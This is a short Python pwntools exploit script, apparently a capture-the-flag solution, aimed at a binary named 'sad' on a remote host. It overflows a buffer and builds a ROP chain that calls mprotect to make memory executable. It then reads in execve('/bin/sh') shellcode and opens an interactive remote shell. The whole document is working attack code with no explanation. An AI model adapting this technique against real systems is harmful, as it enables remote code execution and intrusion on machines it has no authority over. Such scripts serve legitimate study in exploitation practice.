from pwn import *

exe = ELF("./sad")

p = remote("jh2i.com", 50002)

context.binary = './sad'

p.recvline()

rop = ROP(exe.path)

free_space = 0x4b1ab0
offset = 264
bss = 0x00000000004b1000

PopRdi = rop.find_gadget(['pop rdi', 'ret'])[0]
PopRsi = rop.find_gadget(['pop rsi', 'ret'])[0]
PopRdx = rop.find_gadget(['pop rdx', 'ret'])[0]

log.info('Pop Rdi; ret @ 0x%x', PopRdi)

payload = b'M' * offset
payload += p64(PopRdi)
payload += p64(bss)
payload += p64(PopRsi)
payload += p64(0x1000)
payload += p64(PopRdx)
payload += p64(0x7)
payload += p64(exe.sym['mprotect'])

payload += p64(PopRdi)
payload += p64(free_space)
payload += p64(exe.sym['gets'])
payload += p64(free_space + 0x8)

shellcode = asm('''
mov rdi, 0x4b1ab0
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
'''
                )

payload2 = b'/bin/sh\x00' + shellcode
p.sendline(payload)
sleep(1)
p.sendline(payload2)
p.interactive()
